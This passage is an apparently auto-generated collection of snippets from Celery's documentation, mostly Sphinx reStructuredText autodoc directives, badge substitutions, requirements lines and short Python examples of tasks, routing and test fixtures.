celery.app\n\n    .. contents::\n        :local:\n\n    Proxies\n    -------\n\n    .. autodata:: default_app\n\n\n    Functions\n    ---------\n\n    .. autofunction:: app_or_default\n    .. autofunction:: enable_trace\n    .. autofunction:: disable_trace\n```\n\n----------------------------------------\n\nTITLE: Auto-documenting Python Module with Sphinx (reStructuredText)\nDESCRIPTION: This Sphinx directive uses the `autodoc` extension to automatically generate documentation for the `celery.bin.events` Python module. It includes documentation for all members (`:members:`) and even those without docstrings (`:undoc-members:`). Requires Sphinx with the `autodoc` extension enabled and the `celery.bin.events` module must be importable in the Sphinx environment.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.bin.events.rst#2025-04-23_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n.. automodule:: celery.bin.events\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Setting Current Module Context in Sphinx\nDESCRIPTION: This reStructuredText snippet employs the Sphinx `currentmodule` directive to set the default Python module context to `celery.worker.worker`. This allows subsequent autodoc directives to reference objects within this module without full qualification.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.worker.worker.rst#2025-04-23_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n.. currentmodule:: celery.worker.worker\n```\n\n----------------------------------------\n\nTITLE: Setting Current Module Context in Sphinx\nDESCRIPTION: This Sphinx directive sets the default module for subsequent documentation directives like `autofunction` or `autoclass`. It specifies `celery.contrib.abortable` as the current module context, simplifying references to its members within the documentation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.contrib.abortable.rst#2025-04-23_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n.. currentmodule:: celery.contrib.abortable\n```\n\n----------------------------------------\n\nTITLE: Defining reStructuredText Substitution for Wheel Package Badge\nDESCRIPTION: This reStructuredText substitution definition establishes a shortcut named 'wheel'. When '|wheel|' is used, it renders an image directive indicating that Celery is available as a wheel package on PyPI (via shields.io). The image links to the Celery project page on PyPI.\nSOURCE: https://github.com/celery/celery/blob/main/docs/templates/readme.txt#2025-04-23_snippet_3\n\nLANGUAGE: rst\nCODE:\n```\n.. |wheel| image:: https://img.shields.io/pypi/wheel/celery.svg\n    :alt: Celery can be installed via wheel\n    :target: https://pypi.org/project/celery/\n```\n\n----------------------------------------\n\nTITLE: Including Authentication Dependencies from File (requirements.txt)\nDESCRIPTION: This line, typically found in a Python `requirements.txt` file, instructs the `pip` package manager to install dependencies listed in the `extras/auth.txt` file. The `-r` flag signifies a recursive inclusion of requirements from another file, often used to manage optional or feature-specific dependencies like authentication.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/security.txt#2025-04-23_snippet_0\n\nLANGUAGE: requirements\nCODE:\n```\n-r extras/auth.txt\n```\n\n----------------------------------------\n\nTITLE: Defining a clean test environment in tox configuration (INI)\nDESCRIPTION: Defines a specific test environment named 'clean' within a tox configuration file (typically tox.ini). This environment is likely used for executing commands related to cleaning up build artifacts, caches, or previous test runs before executing main tests.\nSOURCE: https://github.com/celery/celery/blob/main/Changelog.rst#2025-04-23_snippet_12\n\nLANGUAGE: ini\nCODE:\n```\n[testenv:clean]\n```\n\n----------------------------------------\n\nTITLE: Documenting Celery Schedules Modules using Sphinx reStructuredText - reStructuredText\nDESCRIPTION: This snippet sets up Sphinx documentation for the celery.schedules Python module using reStructuredText directives. It includes the contents table, defines the current module context, and incorporates the automodule directive to include all members and those without explicit documentation (undoc-members). Required prerequisites are Sphinx and the celery library. The goal is to ensure comprehensive auto-generated API documentation for the celery.schedules module and all its classes or functions.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.schedules.rst#2025-04-23_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n=====================================================\n ``celery.schedules``\n=====================================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.schedules\n\n.. automodule:: celery.schedules\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Defining reStructuredText Substitution for License Badge\nDESCRIPTION: This reStructuredText substitution definition creates a shortcut named 'license'. Using '|license|' inserts an image directive showing the project's license (fetched from PyPI via shields.io) and links to the BSD-3-Clause license text.\nSOURCE: https://github.com/celery/celery/blob/main/docs/templates/readme.txt#2025-04-23_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n.. |license| image:: https://img.shields.io/pypi/l/celery.svg\n    :alt: BSD License\n    :target: https://opensource.org/licenses/BSD-3-Clause\n```\n\n----------------------------------------\n\nTITLE: Importing Celery Deprecated Utils Module\nDESCRIPTION: Example import path for accessing the deprecated utilities module in Celery. This module contains functionality that has been marked for removal in future versions.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.deprecated.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.utils.deprecated import *\n```\n\n----------------------------------------\n\nTITLE: ReStructuredText Module Documentation\nDESCRIPTION: ReStructuredText documentation structure for the celery.utils.time module, including table of contents and module reference directives.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.time.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n==================================================\n ``celery.utils.time``\n==================================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.utils.time\n\n.. automodule:: celery.utils.time\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Configuring RST Documentation for Celery Control Module\nDESCRIPTION: ReStructuredText configuration for documenting the celery.app.control module. Sets up table of contents, current module context, and auto-documentation directives.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.app.control.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n====================================================\n ``celery.app.control``\n====================================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.app.control\n\n.. automodule:: celery.app.control\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Setting Current Module Context (reStructuredText)\nDESCRIPTION: This reStructuredText directive informs the documentation generator (like Sphinx) that subsequent documentation directives (e.g., `autofunction`, `autoclass`) without an explicit module path should refer to the `celery.bin.list` Python module. This simplifies referencing members within that module.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.bin.list.rst#2025-04-23_snippet_1\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. currentmodule:: celery.bin.list\n```\n\n----------------------------------------\n\nTITLE: Generating Local Table of Contents (reStructuredText)\nDESCRIPTION: This reStructuredText directive, typically used with Sphinx, generates a table of contents listing the subsections within the current document scope where the directive is placed. The `:local:` option restricts the TOC to the current section's hierarchy.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.bin.list.rst#2025-04-23_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. contents::\n    :local:\n```\n\n----------------------------------------\n\nTITLE: Creating Task Signatures in Celery (Python)\nDESCRIPTION: Demonstrates how to create task signatures with arguments and execution options, and how to use them with delay() and apply_async() methods.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_8\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.signature((2, 2), countdown=10)\ntasks.add(2, 2)\n\n>>> add.s(2, 2)\ntasks.add(2, 2)\n\n>>> s1 = add.s(2, 2)\n>>> res = s1.delay()\n>>> res.get()\n4\n\n>>> s2 = add.s(2)\n>>> res = s2.delay(8)\n>>> res.get()\n10\n\n>>> s3 = add.s(2, 2, debug=True)\n>>> s3.delay(debug=False)   # debug is now False.\n```\n\n----------------------------------------\n\nTITLE: Initializing a Simple Celery Application in Python\nDESCRIPTION: This snippet demonstrates how to create a basic Celery application with a single task. It initializes the Celery app with a broker URL and defines a 'hello' task that returns 'hello world'.\nSOURCE: https://github.com/celery/celery/blob/main/README.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Celery\n\napp = Celery('hello', broker='amqp://guest@localhost//')\n\n@app.task\ndef hello():\n    return 'hello world'\n```\n\n----------------------------------------\n\nTITLE: Generating Local Table of Contents (Sphinx)\nDESCRIPTION: This reStructuredText directive instructs the Sphinx documentation generator to create a table of contents specific to the current section or subsection where the directive is placed. The `:local:` option limits the depth of the generated table of contents.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.contrib.testing.mocks.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. contents::\n    :local:\n```\n\n----------------------------------------\n\nTITLE: Configuring Sphinx Documentation for Celery ISO8601 Module\nDESCRIPTION: This snippet sets up the Sphinx documentation structure for the celery.utils.iso8601 module. It includes directives for table of contents, current module, and automodule for generating member documentation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.iso8601.rst#2025-04-23_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n==================================================\n ``celery.utils.iso8601``\n==================================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.utils.iso8601\n\n.. automodule:: celery.utils.iso8601\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Defining PyYAML Dependency Version Constraint\nDESCRIPTION: This line specifies that the project requires the PyYAML library, specifically version 3.10 or any subsequent version. It is typically used by Python package managers like pip to ensure the correct dependency version is installed.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/yaml.txt#2025-04-23_snippet_0\n\nLANGUAGE: requirements\nCODE:\n```\nPyYAML>=3.10\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery for Session-wide Testing in Python\nDESCRIPTION: This fixture configures Celery for session-wide testing by setting the broker URL and result backend. It's intended to be added to the conftest.py file for use across multiple tests.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_15\n\nLANGUAGE: Python\nCODE:\n```\n@pytest.fixture(scope='session')\ndef celery_config():\n    return {\n        'broker_url': 'amqp://',\n        'result_backend': 'rpc',\n    }\n```\n\n----------------------------------------\n\nTITLE: Configuring Sphinx Documentation Structure for Celery Autoretry Module\nDESCRIPTION: ReStructuredText directives for configuring Sphinx documentation layout and module references for the celery.app.autoretry module, including table of contents and module member documentation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.app.autoretry.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. contents::\n    :local:\n.. currentmodule:: celery.app.autoretry\n\n.. automodule:: celery.app.autoretry\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Generating Local Table of Contents with Sphinx\nDESCRIPTION: This Sphinx directive generates a local table of contents for the current document section. The `:local:` option ensures that only subsections of the current section are included, providing navigation within the specific part of the documentation related to `celery.contrib.abortable`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.contrib.abortable.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. contents::\n    :local:\n```\n\n----------------------------------------\n\nTITLE: Simplified Task Router Function\nDESCRIPTION: Demonstrates a simplified task router function that only uses the task name to determine routing, while still allowing for future extensibility.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_17\n\nLANGUAGE: python\nCODE:\n```\ndef route_for_task(name, *args, **kwargs):\n    from proj import tasks\n    if name == tasks.add.name:\n        return {'queue': 'hipri', 'priority': 9}\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure for Celery Text Utils\nDESCRIPTION: ReStructuredText documentation structure defining the documentation format for the celery.utils.text module. Includes section headers, table of contents directive, and module documentation directives.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.text.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n=====================================================\n ``celery.utils.text``\n=====================================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.utils.text\n\n.. automodule:: celery.utils.text\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Specifying Python Build and Development Dependencies - requirements text - none\nDESCRIPTION: Lists the required and optional Python packages for project build, development, and QA workflows. Key dependencies include setuptools and wheel for package building, flake8 and pydocstyle for linting and documentation style checks, tox for environment testing, and sphinx2rst for documentation. Some tools, like cyanide, are commented out, indicating temporary disablement. This list is intended for use in requirements.txt or similar dependency files and does not define logic, but ensures consistent environments for developers.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/pkgutils.txt#2025-04-23_snippet_0\n\nLANGUAGE: none\nCODE:\n```\nsetuptools>=40.8.0\nwheel>=0.33.1\nflake8>=3.8.3\nflake8-docstrings>=1.7.0\npydocstyle==6.3.0\ntox>=3.8.4\nsphinx2rst>=1.0\n# Disable cyanide until it's fully updated.\n# cyanide>=1.0.1\nbumpversion==0.6.0\npyperclip==1.9.0\n```\n\n----------------------------------------\n\nTITLE: Configuring reStructuredText Documentation for Celery Registry Module\nDESCRIPTION: Sets up documentation structure for the celery.app.registry module using reStructuredText directives, including table of contents, current module declaration, and automodule configuration.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.app.registry.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n================================\n ``celery.app.registry``\n================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.app.registry\n\n.. automodule:: celery.app.registry\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Including External RST File in Celery Documentation\nDESCRIPTION: This directive includes the Changelog.rst file from the parent directory. The include directive is a standard reStructuredText feature that inserts the contents of another file into the current document.\nSOURCE: https://github.com/celery/celery/blob/main/docs/changelog.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n.. include:: ../Changelog.rst\n```\n\n----------------------------------------\n\nTITLE: ReStructuredText Documentation Directives for Celery Base Module\nDESCRIPTION: Sets up the documentation structure for the celery.bin.base module using reStructuredText directives. Includes table of contents, module reference, and autodoc configuration.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.bin.base.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n================================\n ``celery.bin.base``\n================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.bin.base\n\n.. automodule:: celery.bin.base\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Dynamic Task Shadow Name Implementation\nDESCRIPTION: Example of implementing dynamic task naming using the shadow header feature\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Task\nfrom celery.utils.imports import qualname\n\nclass call_as_task(Task):\n\n    def shadow_name(self, args, kwargs, options):\n        return 'call_as_task:{0}'.format(qualname(args[0]))\n\n    def run(self, fun, *args, **kwargs):\n        return fun(*args, **kwargs)\ncall_as_task = app.register_task(call_as_task())\n```\n\n----------------------------------------\n\nTITLE: Defining reStructuredText Substitution for Python Implementation Badge\nDESCRIPTION: This reStructuredText substitution definition creates a shortcut named 'pyimp'. When '|pyimp|' is used, it inserts an image badge (via shields.io/PyPI) indicating the supported Python implementations (e.g., CPython, PyPy). The image links to the Celery project page on PyPI.\nSOURCE: https://github.com/celery/celery/blob/main/docs/templates/readme.txt#2025-04-23_snippet_5\n\nLANGUAGE: rst\nCODE:\n```\n.. |pyimp| image:: https://img.shields.io/pypi/implementation/celery.svg\n    :alt: Support Python implementations.\n    :target: https://pypi.org/project/celery/\n```\n\n----------------------------------------\n\nTITLE: Generating API Reference for celery.contrib.migrate Module - reStructuredText\nDESCRIPTION: This snippet structures the Sphinx documentation for the celery.contrib.migrate module. It includes section headers, a contents table, and directives to fetch all documented and undocumented members for comprehensive API coverage. Required dependencies include Sphinx and the celery codebase; no input parameters are needed. The output is a formatted HTML or PDF documentation page, intended for library users needing implementation reference. Constraints: this file is for Sphinx doc processing and not to be executed as a script.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.contrib.migrate.rst#2025-04-23_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n============================\n ``celery.contrib.migrate``\n============================\n\n.. contents::\n    :local:\n\n.. currentmodule:: celery.contrib.migrate\n\n.. automodule:: celery.contrib.migrate\n    :members:\n    :undoc-members:\n\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery Quorum Queue Detection\nDESCRIPTION: This configuration setting enables the Celery worker to detect and potentially interact differently with Quorum Queues, facilitating initial support for this queue type.\nSOURCE: https://github.com/celery/celery/blob/main/Changelog.rst#2025-04-23_snippet_10\n\nLANGUAGE: Configuration\nCODE:\n```\n:setting:`worker_detect_quorum_queues`\n```\n\n----------------------------------------\n\nTITLE: ReStructuredText Module Documentation Headers\nDESCRIPTION: Sets up the documentation structure for the celery.backends module using reStructuredText directives for table of contents, current module declaration, and automodule generation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.backends.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n===========================\n ``celery.backends``\n===========================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.backends\n\n.. automodule:: celery.backends\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Module Reference\nDESCRIPTION: ReStructuredText documentation defining the module reference for celery.utils.term, including table of contents and auto-documentation directives.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.term.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n=====================================================\n ``celery.utils.term``\n=====================================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.utils.term\n\n.. automodule:: celery.utils.term\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Module Reference Path\nDESCRIPTION: RST directive specifying the current module being documented in the Sphinx documentation system.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.deprecated.rst#2025-04-23_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n.. currentmodule:: celery.utils.deprecated\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery Default Task Queue Type\nDESCRIPTION: This configuration setting specifies the default queue type to be used for tasks. It is relevant for enabling features like Quorum Queues.\nSOURCE: https://github.com/celery/celery/blob/main/Changelog.rst#2025-04-23_snippet_9\n\nLANGUAGE: Configuration\nCODE:\n```\n:setting:`task_default_queue_type`\n```\n\n----------------------------------------\n\nTITLE: Importing Celery Utils Dispatch Module in Python\nDESCRIPTION: This code snippet demonstrates how to import the celery.utils.dispatch module in Python. It's typically used in Celery-related projects for dispatch functionality.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.dispatch.rst#2025-04-23_snippet_0\n\nLANGUAGE: Python\nCODE:\n```\nfrom celery.utils import dispatch\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure for Celery Worker Control\nDESCRIPTION: Sphinx/reStructuredText documentation structure that defines the layout and configuration for the celery.worker.control module documentation. Includes table of contents, module reference and member documentation directives.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.worker.control.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n=============================================\n ``celery.worker.control``\n=============================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.worker.control\n\n.. automodule:: celery.worker.control\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: ReStructuredText Module Documentation Headers\nDESCRIPTION: Sets up the documentation structure for the celery.app.annotations module using reStructuredText directives for auto-documentation generation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.app.annotations.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n==========================================\n ``celery.app.annotations``\n==========================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.app.annotations\n\n.. automodule:: celery.app.annotations\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Restructured Text Documentation Headers\nDESCRIPTION: ReStructuredText formatting for module documentation including table of contents and module reference directives\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.app.defaults.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n===============================================================\n ``celery.app.defaults``\n===============================================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.app.defaults\n\n.. automodule:: celery.app.defaults\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure for Celery Log Utils\nDESCRIPTION: Sphinx documentation configuration for the celery.utils.log module. Uses RST directives to set up the documentation structure including table of contents, current module reference, and automodule configuration.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.log.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n=====================================================\n ``celery.utils.log``\n=====================================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.utils.log\n\n.. automodule:: celery.utils.log\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure for celery.security.utils\nDESCRIPTION: ReStructuredText documentation configuration that sets up the module documentation structure with table of contents and automodule directives for celery.security.utils.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.security.utils.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n==========================================\n ``celery.security.utils``\n==========================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.security.utils\n\n.. automodule:: celery.security.utils\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Queues Class Documentation in RST\nDESCRIPTION: RestructuredText directive for auto-documenting the Queues class with all members and undocumented members.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.app.amqp.rst#2025-04-23_snippet_4\n\nLANGUAGE: rst\nCODE:\n```\n.. autoclass:: Queues\n        :members:\n        :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Generating Local Table of Contents with Sphinx (reStructuredText)\nDESCRIPTION: This Sphinx directive `.. contents::` generates a table of contents for the current document section. The `:local:` option restricts the table of contents to the current section only, excluding subsections.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.contrib.pytest.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. contents::\n    :local:\n```\n\n----------------------------------------\n\nTITLE: Displaying Banner Image and Badges in reStructuredText\nDESCRIPTION: This section displays the Celery project banner image using the `.. image::` directive and then includes several status badges using the previously defined substitution shortcuts (`|build-status|`, `|license|`, etc.). This provides a quick visual overview of the project's status.\nSOURCE: https://github.com/celery/celery/blob/main/docs/templates/readme.txt#2025-04-23_snippet_7\n\nLANGUAGE: rst\nCODE:\n```\n.. image:: https://docs.celeryq.dev/en/latest/_images/celery-banner-small.png\n\n|build-status| |license| |wheel| |pyversion| |pyimp|\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure for Celery Worker Components\nDESCRIPTION: RestructuredText documentation configuration showing the module reference, table of contents settings, and autodoc directives for the celery.worker.components module.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.worker.components.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n========================================\n ``celery.worker.components``\n========================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.worker.components\n\n.. automodule:: celery.worker.components\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Autogenerating Module Documentation (Sphinx)\nDESCRIPTION: This reStructuredText directive uses the Sphinx autodoc extension to automatically generate documentation for the specified Python module (`celery.contrib.testing.mocks`). The `:members:` option includes documentation for all members (functions, classes, etc.) within the module, and `:undoc-members:` ensures that members without explicit docstrings are also included in the output.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.contrib.testing.mocks.rst#2025-04-23_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n.. automodule:: celery.contrib.testing.mocks\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Setting Current Module Context in Sphinx\nDESCRIPTION: This Sphinx directive sets the context to the `celery.utils.sysinfo` module. Subsequent Sphinx directives that refer to Python objects (like `autofunction`, `autoclass`) will assume they belong to this module unless specified otherwise.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.sysinfo.rst#2025-04-23_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n.. currentmodule:: celery.utils.sysinfo\n```\n\n----------------------------------------\n\nTITLE: Configuring Sphinx Autodocumentation for celery.bin.result\nDESCRIPTION: This reStructuredText block employs Sphinx directives to configure automatic documentation for the `celery.bin.result` Python module. It generates a local table of contents (`.. contents::`), sets the context to the specified module (`.. currentmodule::`), and uses `.. automodule::` with `:members:` and `:undoc-members:` options to automatically pull documentation for all members from the module's source code and docstrings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.bin.result.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n=====================================================\n ``celery.bin.result``\n=====================================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.bin.result\n\n.. automodule:: celery.bin.result\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Configuring RST Documentation for Celery Asynchronous Backends\nDESCRIPTION: This RST code snippet sets up the documentation structure for the celery.backends.asynchronous module. It includes directives for table of contents, current module, and automodule for comprehensive documentation generation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.backends.asynchronous.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n=====================================\n ``celery.backends.asynchronous``\n=====================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.backends.asynchronous\n\n.. automodule:: celery.backends.asynchronous\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: RestructuredText Module Documentation Format\nDESCRIPTION: RestructuredText documentation structure defining the module documentation for celery.backends.filesystem, including table of contents and module autoloading directives.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.backends.filesystem.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n==========================================\n ``celery.backends.filesystem``\n==========================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.backends.filesystem\n\n.. automodule:: celery.backends.filesystem\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Defining Resources Section in reStructuredText\nDESCRIPTION: This snippet sets up the structure for a resources section in reStructuredText format. It includes a title, table of contents, and an external include directive.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/resources.rst#2025-04-23_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. _resources:\n\n===========\n Resources\n===========\n\n.. contents::\n    :local:\n    :depth: 2\n\n.. include:: ../includes/resources.txt\n```\n\n----------------------------------------\n\nTITLE: Importing Celery Security Serialization Module\nDESCRIPTION: Module import definition for celery.security.serialization showing the path structure and documentation configuration.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.security.serialization.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\ncelery.security.serialization\n```\n\n----------------------------------------\n\nTITLE: Defining RestructuredText Document Structure\nDESCRIPTION: RestructuredText markup defining the documentation structure including table of contents, sections, and navigation elements for the Celery documentation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/index.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n.. toctree::\n    :maxdepth: 1\n\n    copyright\n\n.. toctree::\n    :maxdepth: 2\n\n    getting-started/index\n    userguide/index\n\n.. toctree::\n    :maxdepth: 1\n\n    django/index\n    contributing\n    community\n    tutorials/index\n    faq\n    changelog\n    reference/index\n    internals/index\n    history/index\n    glossary\n```\n\n----------------------------------------\n\nTITLE: Module Import Declaration in RST\nDESCRIPTION: RestructuredText directive specifying the current module namespace for documentation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.app.amqp.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. currentmodule:: celery.app.amqp\n```\n\n----------------------------------------\n\nTITLE: Module Documentation Directive\nDESCRIPTION: Sphinx automodule directive that generates documentation for all members and undocumented members in the deprecated utils module.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.deprecated.rst#2025-04-23_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n.. automodule:: celery.utils.deprecated\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Including Contributing Documentation RST Directive\nDESCRIPTION: RestructuredText include directive that imports the CONTRIBUTING.rst file from one directory level up.\nSOURCE: https://github.com/celery/celery/blob/main/docs/contributing.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. include:: ../CONTRIBUTING.rst\n```\n\n----------------------------------------\n\nTITLE: Defining RST Documentation Structure for Celery Objects Module\nDESCRIPTION: ReStructuredText documentation configuration for the celery.utils.objects module. Sets up the documentation structure with table of contents and module reference.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.objects.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n==================================================\n ``celery.utils.objects``\n==================================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.utils.objects\n\n.. automodule:: celery.utils.objects\n    :members:\n    :undoc-members:\n```"
  }
]